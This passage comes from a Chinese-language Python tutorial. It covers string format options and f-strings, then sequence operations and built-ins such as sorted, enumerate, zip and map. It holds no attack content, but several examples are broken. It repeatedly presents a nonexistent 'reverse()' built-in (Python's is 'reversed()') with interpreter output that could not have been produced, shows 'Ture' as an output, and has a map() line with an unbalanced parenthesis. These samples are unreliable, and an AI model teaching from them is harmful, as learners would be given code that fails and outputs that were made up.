<p><strong>注意，这种用法只对数字有效：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;:010&#125;&quot;.format(&quot;FishC&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#39&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    &quot;&#123;:010&#125;&quot;.format(&quot;FishC&quot;)</span><br><span class="line">ValueError: &#x27;=&#x27; alignment not allowed in string format specifier</span><br></pre></td></tr></table></figure>
<p>还可以在对齐（[align]）选项的前面通过填充选项（[fill]）来指定填充的字符：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;1:%&gt;10&#125;&#123;0:%&lt;10&#125;&quot;.format(520, 250)</span><br><span class="line">&#x27;%%%%%%%250520%%%%%%%&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:0=10&#125;&quot;.format(520)</span><br><span class="line">&#x27;0000000520&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:0=10&#125;&quot;.format(-520)</span><br><span class="line">&#x27;-000000520&#x27;</span><br></pre></td></tr></table></figure></p>
<h4 id="10-5-3-符号（-sign-）选项"><a href="#10-5-3-符号（-sign-）选项" class="headerlink" title="10.5.3 符号（[sign]）选项"></a>10.5.3 符号（[sign]）选项</h4><p>符号（[sign]）选项仅对数字类型有效，可以使用下面3个值：</p>
<p><img src="/image/字符串符号.png" alt="字符串符号"></p>
<h4 id="10-5-4-精度（-precision-）选项"><a href="#10-5-4-精度（-precision-）选项" class="headerlink" title="10.5.4 精度（[.precision]）选项"></a>10.5.4 精度（[.precision]）选项</h4><p>精度（[.precision]）选项是一个十进制整数，对于不同类型的参数，它的效果是不一样的：</p>
<ul>
<li>对于以 ‘f’ 或 ‘F’ 格式化的浮点数值来说，是限定小数点后显示多少个数位</li>
<li>对于以 ‘g’ 或 ‘G’ 格式化的浮点数值来说，是限定小数点前后共显示多少个数位</li>
<li>对于非数字类型来说，限定最大字段的大小（换句话说就是要使用多少个来自字段内容的字符）</li>
<li>对于整数来说，则不允许使用该选项值</li>
</ul>
<h4 id="10-5-5-类型（-type-）选项"><a href="#10-5-5-类型（-type-）选项" class="headerlink" title="10.5.5 类型（[type]）选项"></a>10.5.5 类型（[type]）选项</h4><p>类型（[type]）选项决定了数据应该如何呈现。<br>以下类型适用于整数：<br><img src="/image/类型整数.jpg" alt="适用整数]"><br>以下类型值适用于浮点数、复数和整数（自动转换为等值的浮点数）如下：<br><img src="/image/字符串类型.png" alt="字符串类型"></p>
<h4 id="10-5-7-更灵活的玩法"><a href="#10-5-7-更灵活的玩法" class="headerlink" title="10.5.7 更灵活的玩法"></a>10.5.7 更灵活的玩法</h4><p>Python 事实上支持通过关键参数来设置选项的值，比如下面代码通过参数来调整输出的精度：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;:.&#123;prec&#125;f&#125;&quot;.format(3.1415, prec=2)</span><br><span class="line">&#x27;3.14&#x27;</span><br></pre></td></tr></table></figure><br>同时设置多个选项也是没问题的，只要你自己不乱，Python 就不会乱：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;:&#123;fill&#125;&#123;align&#125;&#123;width&#125;.&#123;prec&#125;&#123;ty&#125;&#125;&quot;.format(3.1415, fill=&#x27;+&#x27;, align=&#x27;^&#x27;, width=10, prec=3, ty=&#x27;g&#x27;)</span><br><span class="line">&#x27;+++3.14+++&#x27;</span><br></pre></td></tr></table></figure></p>
<h4 id="10-5-8-f-字符串"><a href="#10-5-8-f-字符串" class="headerlink" title="10.5.8  f-字符串"></a>10.5.8  f-字符串</h4><p>Python 随着版本的更迭，它的语法也是在不断完善的。“简洁胜于复杂”是 Python 之禅中强调的理念。</p>
<p>因此，在 Python3.6 的更新中，他们给添加了一个新的语法，叫 f-string，也就是 f-字符串。</p>
<p>f-string 可以直接看作是 format() 方法的语法糖，它进一步简化了格式化字符串的操作并带来了性能上的提升。</p>
<ul>
<li>注：语法糖（英语：Syntactic sugar）是由英国计算机科学家彼得·兰丁发明的一个术语，指计算机语言中添加的某种语法，这种语法对语言的功能没有影响，但是更方便程序员使用。语法糖让程序更加简洁，有更高的可读性。</li>
</ul>
<p>来，我们使用 f-string 将前面讲解 format() 方法的例子给大家修改一遍，你就知道该怎么玩了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; year = 2010</span><br><span class="line">&gt;&gt;&gt; f&quot;鱼C工作室成立于 &#123;year&#125; 年&quot;</span><br><span class="line">&#x27;鱼C工作室成立于 2010 年&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; f&quot;1+2=&#123;1+2&#125;, 2的平方是&#123;2*2&#125;，3的立方是&#123;3*3*3&#125;&quot;</span><br><span class="line">&#x27;1+2=3, 2的平方是4，3的立方是27&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:010&#125;&quot;.format(-520)</span><br><span class="line">&gt;&gt;&gt; f&quot;&#123;-520:010&#125;&quot;</span><br><span class="line">&#x27;-000000520&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:,&#125;&quot;.format(123456789)</span><br><span class="line">&gt;&gt;&gt; f&quot;&#123;123456789:,&#125;&quot;</span><br><span class="line">&#x27;123,456,789&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:.2f&#125;&quot;.format(3.1415)</span><br><span class="line">&gt;&gt;&gt; f&quot;&#123;3.1415:.2f&#125;&quot;</span><br><span class="line">&#x27;3.14&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="11-序列"><a href="#11-序列" class="headerlink" title="11 序列"></a>11 序列</h2><h3 id="11-1-列表、元组、字符串的共同点"><a href="#11-1-列表、元组、字符串的共同点" class="headerlink" title="11.1 列表、元组、字符串的共同点"></a>11.1 列表、元组、字符串的共同点</h3><ul>
<li>都可以通过索引获取每一个元素</li>
<li>第一个元素的索引值都是 0</li>
<li>都可以通过切片的方法获得一个范围内的元素的集合</li>
<li>有很多共同的运算符</li>
</ul>
<p>因此，列表、元组和字符串，Python 将它们统称为序列。<br>根据是否能被修改这一特性，可以将序列分为可变序列和不可变序列：比如列表就是可变序列，而元组和字符串则是不可变序列。</p>
<h3 id="11-2-加号（-）和乘号"><a href="#11-2-加号（-）和乘号" class="headerlink" title="11.2 加号（+）和乘号(*)"></a>11.2 加号（+）和乘号(*)</h3><p>首先是加减乘除，只有加号（+）和乘号（*）可以用上，序列之间的加法表示将两个序列进行拼接；乘法表示将序列进行重复，也就是拷贝：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [1, 2, 3] + [4, 5, 6]</span><br><span class="line">[1, 2, 3, 4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; (1, 2, 3) + (4, 5, 6)</span><br><span class="line">(1, 2, 3, 4, 5, 6)</span><br><span class="line">&gt;&gt;&gt; &quot;123&quot; + &quot;456&quot;</span><br><span class="line">&#x27;123456&#x27;</span><br><span class="line">&gt;&gt;&gt; [1, 2, 3] * 3</span><br><span class="line">[1, 2, 3, 1, 2, 3, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; (1, 2, 3) * 3</span><br><span class="line">(1, 2, 3, 1, 2, 3, 1, 2, 3)</span><br><span class="line">&gt;&gt;&gt; &quot;123&quot; * 3</span><br><span class="line">&#x27;123123123&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="11-3-关于-“可变”-和-“不可变”-的思考"><a href="#11-3-关于-“可变”-和-“不可变”-的思考" class="headerlink" title="11.3 关于 “可变” 和 “不可变” 的思考"></a>11.3 关于 “可变” 和 “不可变” 的思考</h3><p><strong>可变序列</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; id(s)</span><br><span class="line">2285532322944       </span><br><span class="line">&gt;&gt;&gt; s *= 2</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">[1, 2, 3, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; id(s)</span><br><span class="line">2285532322944       </span><br></pre></td></tr></table></figure><br><strong>不可变序列</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t = (1, 2, 3)</span><br><span class="line">&gt;&gt;&gt; id(t)</span><br><span class="line">2285532205952       </span><br><span class="line">&gt;&gt;&gt; t *= 2</span><br><span class="line">&gt;&gt;&gt; t</span><br><span class="line">(1, 2, 3, 1, 2, 3)</span><br><span class="line">&gt;&gt;&gt; id(t)</span><br><span class="line">2285532393920           #观察这里</span><br></pre></td></tr></table></figure><br>虽然可变序列和不可变序列看上去都是 “可变” 的，但实现原理却是天壤之别：可变序列是在原位置修改 “扩容”，而不可变序列则是将内容 “扩容” 后再放到一个新的位置上去。</p>
<h3 id="11-4-是（is）和不是（is-not）"><a href="#11-4-是（is）和不是（is-not）" class="headerlink" title="11.4  是（is）和不是（is not）"></a>11.4  是（is）和不是（is not）</h3><p>是（is）和不是（is not）被称之为同一性运算符，用于检测两个对象之间的 id 值是否相等：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; y = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; x is y</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; x = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; y = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; x is not y</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h3 id="11-5-包含（in）和不包含（not-in）"><a href="#11-5-包含（in）和不包含（not-in）" class="headerlink" title="11.5 包含（in）和不包含（not in）"></a>11.5 包含（in）和不包含（not in）</h3><p>in 运算符是用于判断某个元素是否包含在序列中的，而 not in 则恰恰相反：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;Fish&quot; in &quot;FishC&quot;</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;鱼&quot; in &quot;鱼C&quot;</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;C&quot; not in &quot;FishC&quot;</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<h3 id="11-6-del-语句"><a href="#11-6-del-语句" class="headerlink" title="11.6  del 语句"></a>11.6  del 语句</h3><p>del 语句用于删除一个或多个指定的对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; y = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; del x, y</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#52&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    x</span><br><span class="line">NameError: name &#x27;x&#x27; is not defined</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#53&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    y</span><br><span class="line">NameError: name &#x27;y&#x27; is not defined</span><br></pre></td></tr></table></figure>
<h3 id="11-7-list-、tuple-和-str"><a href="#11-7-list-、tuple-和-str" class="headerlink" title="11.7 list()、tuple() 和 str()"></a>11.7 list()、tuple() 和 str()</h3><p>list()、tuple() 和 str() 这三个 BIF 函数主要是实现列表、元组和字符串的转换。</p>
<h3 id="11-8-min-和-max"><a href="#11-8-min-和-max" class="headerlink" title="11.8 min() 和 max()"></a>11.8 min() 和 max()</h3><p>min() 和 max() 这两个函数的功能是：对比传入的参数，并返回最小值和最大值。</p>
<p>它们都有两种函数原型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min(iterable, *[, key, default])</span><br><span class="line">min(arg1, arg2, *args[, key])</span><br></pre></td></tr></table></figure>
<p>以及<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max(iterable, *[, key, default])</span><br><span class="line">max(arg1, arg2, *args[, key])</span><br></pre></td></tr></table></figure><br>这第一种传入的是一个可迭代对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 1, 2, 3, 5]</span><br><span class="line">&gt;&gt;&gt; min(s)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; t = &quot;Mortal&quot;</span><br><span class="line">&gt;&gt;&gt; max(t)</span><br><span class="line">&#x27;t&#x27;</span><br></pre></td></tr></table></figure><br>这第二种传入多个参数，它们会自动找出其中的最小值和最大值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; min(1, 2, 3, 0, 6)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; max(1, 2, 3, 0, 6)</span><br><span class="line">6</span><br></pre></td></tr></table></figure></p>
<h3 id="11-9-len-和-sum"><a href="#11-9-len-和-sum" class="headerlink" title="11.9 len() 和 sum()"></a>11.9 len() 和 sum()</h3><p>len() 函数我们前面用过好多次了，基本用法不必啰嗦，大家都懂~</p>
<p>不过它有个最大的可承受范围，可能有些同学还不知道，比如说这样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(range(2 ** 100))</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#42&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    len(range(2 ** 100))</span><br><span class="line">OverflowError: Python int too large to convert(转换) to C ssize_t</span><br></pre></td></tr></table></figure><br>这个错误是由于 len() 函数的参数太大导致的，我们知道 Python 为了执行的效率，它内部几乎都是用效率更高的 C 语言来实现的。<br>而这个 len() 函数为了让 Python 自带的数据结构可以走后门，它会直接读取 C 语言结构体里面对象的长度。<br>所以，如果检测的对象超过某个数值，就会出错。</p>
<p>通常对于 32 位平台来说，这个最大的数值是 <code>2**31 - 1</code>；而对于 64 位平台来说，这个最大的数值是 <code>2**63 - 1</code>。</p>
<p>sum() 函数用于计算迭代对象中各项的和：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 0, 0, 8, 6]</span><br><span class="line">&gt;&gt;&gt; sum(s)</span><br><span class="line">15</span><br></pre></td></tr></table></figure><br>它有一个 start 参数，用于指定求和计算的起始数值，比如这里我们设置为从 100 开始加起：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sum(s, start=100)</span><br><span class="line">115</span><br></pre></td></tr></table></figure></p>
<h3 id="11-10-sorted-和-reverse"><a href="#11-10-sorted-和-reverse" class="headerlink" title="11.10 sorted() 和 reverse()"></a>11.10 sorted() 和 reverse()</h3><p>sorted() 函数将重新排序 iterable 参数中的元素，并将结果返回一个新的列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 2, 3, 0, 6]</span><br><span class="line">&gt;&gt;&gt; sorted(s)</span><br><span class="line">[0, 1, 2, 3, 6]</span><br></pre></td></tr></table></figure>
<p>sorted() 函数也支持 key 和 reverse 两个参数，用法跟列表的 sort() 方法一致：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted(s, reverse=True)</span><br><span class="line">[6, 3, 2, 1, 0]</span><br><span class="line">&gt;&gt;&gt; s.sort(reverse=True)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">[6, 3, 2, 1, 0]</span><br><span class="line">&gt;&gt;&gt; t = [&quot;FishC&quot;, &quot;Apple&quot;, &quot;Book&quot;, &quot;Banana&quot;, &quot;Pen&quot;]</span><br><span class="line">&gt;&gt;&gt; sorted(t)</span><br><span class="line">[&#x27;Apple&#x27;, &#x27;Banana&#x27;, &#x27;Book&#x27;, &#x27;FishC&#x27;, &#x27;Pen&#x27;]</span><br><span class="line">&gt;&gt;&gt; sorted(t, key=len)</span><br><span class="line">[&#x27;Pen&#x27;, &#x27;Book&#x27;, &#x27;FishC&#x27;, &#x27;Apple&#x27;, &#x27;Banana&#x27;]</span><br></pre></td></tr></table></figure><br>sorted(t, key=len) 这个，因为这个 key 参数，指定的是一个干预排序算法的函数。<br>比如这里我们指定为 len() 函数，那么 Python 在排序的过程中，就会先将列表中的每一个元素调用一次 len() 函数，然后比较的是 len() 返回的结果。<br>所以，sorted(t, key=len) 比较的就是每个元素的长度。</p>
<p>reverse() 函数将返回参数的反向迭代器。</p>
<p>举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 2, 5, 8, 0]</span><br><span class="line">&gt;&gt;&gt; reverse(s)</span><br><span class="line">&lt;list_reverseiterator object at 0x0000022926732AC0&gt;</span><br></pre></td></tr></table></figure><br>大家看，它不是直接返回所见即所得的结果，它返回的一串奇奇怪怪的英文……<br>刚刚我们说过，它返回的结果是一个迭代器，并且我们可以把它当可迭代对象处理。<br>既然如此，我们就可以使用 list() 函数将其转换为列表<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(reverse(s))</span><br><span class="line">[0, 8, 5, 2, 1]</span><br></pre></td></tr></table></figure><br>reverse() 函数也同样支持任何形式的可迭代对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(reverse(&quot;FishC&quot;))</span><br><span class="line">[&#x27;C&#x27;, &#x27;h&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;F&#x27;]</span><br><span class="line">&gt;&gt;&gt; list(reverse((1, 2, 5, 9, 3)))</span><br><span class="line">[3, 9, 5, 2, 1]</span><br><span class="line">&gt;&gt;&gt; list(reverse(range(0, 10)))</span><br><span class="line">[9, 8, 7, 6, 5, 4, 3, 2, 1, 0]</span><br></pre></td></tr></table></figure></p>
<h3 id="11-11-all-和any"><a href="#11-11-all-和any" class="headerlink" title="11.11 all()和any()"></a>11.11 all()和any()</h3><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191253-1-1.html">all()</a> 函数是判断可迭代对象中是否所有元素的值都为真；</p>
<p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191254-1-1.html">any()</a> 函数则是判断可迭代对象中是否存在某个元素的值为真。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [1, 1, 0]</span><br><span class="line">&gt;&gt;&gt; y = [1, 1, 9]</span><br><span class="line">&gt;&gt;&gt; all(x)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; all(y)</span><br><span class="line">Ture</span><br><span class="line">&gt;&gt;&gt; any(x)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; any(y)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<h3 id="11-12-enumerate"><a href="#11-12-enumerate" class="headerlink" title="11.12  enumerate()"></a>11.12  enumerate()</h3><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191255-1-1.html">enumerate()</a> 函数用于返回一个枚举对象，它的功能就是将可迭代对象中的每个元素及从 0 开始的序号共同构成一个二元组的列表：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; seasons = [&quot;Spring&quot;, &quot;Summer&quot;, &quot;Fall&quot;, &quot;Winter&quot;]</span><br><span class="line">&gt;&gt;&gt; list(enumerate(seasons))</span><br><span class="line">[(0, &#x27;Spring&#x27;), (1, &#x27;Summer&#x27;), (2, &#x27;Fall&#x27;), (3, &#x27;Winter&#x27;)]</span><br></pre></td></tr></table></figure><br>它有一个 start 参数，可以自定义序号开始的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i, j in enumerate(seasons, start=10):</span><br><span class="line">...     print(i, &quot;-&gt;&quot;, j)</span><br><span class="line">... </span><br><span class="line">10 -&gt; Spring</span><br><span class="line">11 -&gt; Summer</span><br><span class="line">12 -&gt; Fall</span><br><span class="line">13 -&gt; Winter</span><br></pre></td></tr></table></figure></p>
<h3 id="11-13-zip"><a href="#11-13-zip" class="headerlink" title="11.13 zip()"></a>11.13 zip()</h3><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191256-1-1.html">zip()</a> 函数用于创建一个聚合多个可迭代对象的迭代器。</p>
<p>做法是将作为参数传入的每个可迭代对象的每个元素依次组合成元组，即第 i 个元组包含来自每个参数的第 i 个元素。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; y = [4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; zipped = zip(x, y)</span><br><span class="line">&gt;&gt;&gt; list(zipped)</span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br><span class="line">&gt;&gt;&gt; z = [7, 8, 9]</span><br><span class="line">&gt;&gt;&gt; zipped = zip(x, y, z)</span><br><span class="line">&gt;&gt;&gt; list(zipped)</span><br><span class="line">[(1, 4, 7), (2, 5, 8), (3, 6, 9)]</span><br></pre></td></tr></table></figure>
<p>这里有一点需要大家注意的，就是如果传入的可迭代对象长度不一致，那么将会以最短的那个为准：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; z = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; zipped = zip(x, y, z)</span><br><span class="line">&gt;&gt;&gt; list(zipped)</span><br><span class="line">[(1, 4, &#x27;F&#x27;), (2, 5, &#x27;i&#x27;), (3, 6, &#x27;s&#x27;)]</span><br></pre></td></tr></table></figure><br>当我们不关心较长的可迭代对象多出的数据时，使用 zip() 函数无疑是最佳的选择，因为它自动裁掉多余的部分。</p>
<p>但是，如果那些值对于我们来说是有意义的，我们可以使用 itertools 模块的 zip_longest() 函数来代替：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import itertools</span><br><span class="line">&gt;&gt;&gt; zipped = itertools.zip_longest(x, y, z)</span><br><span class="line">&gt;&gt;&gt; list(zipped)</span><br><span class="line">[(1, 4, &#x27;F&#x27;), (2, 5, &#x27;i&#x27;), (3, 6, &#x27;s&#x27;), (None, None, &#x27;h&#x27;), (None, None, &#x27;C&#x27;)]</span><br></pre></td></tr></table></figure></p>
<h3 id="11-14-map"><a href="#11-14-map" class="headerlink" title="11.14 map()"></a>11.14 map()</h3><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191261-1-1.html">map()</a> 函数会根据提供的函数对指定的可迭代对象的每个元素进行运算，并将返回运算结果的迭代器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; mapped = map(ord, &quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; list(mapped)</span><br><span class="line">[70, 105, 115, 104, 67]</span><br></pre></td></tr></table></figure>
<p>如果指定的函数需要两个参数，后面跟着的可迭代对象的数量也应该是两个：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; mapped = map(pow, [2, 3, 10], [5, 2, 3]))</span><br><span class="line">&gt;&gt;&gt; list(mapped)</span><br><span class="line">[32, 9, 1000]</span><br></pre></td></tr></table></figure><br>上面代码其实就相当于是：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [pow(2, 5), pow(3, 2), pow(10, 3)]</span><br><span class="line">[32, 9, 1000]</span><br></pre></td></tr></table></figure><br>可以看出，如果数量一多，使用 map() 函数要方便许多。</p>
<p>如果可迭代对象的长度不一致，那么 Python 采取的做法跟 zip() 函数一样，都是在最短的可迭代对象终止时结束：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(map(max, [1, 3, 5], [2, 2, 2], [0, 3, 9, 8]))</span><br><span class="line">[2, 3, 9]</span><br></pre></td></tr></table></figure></p>
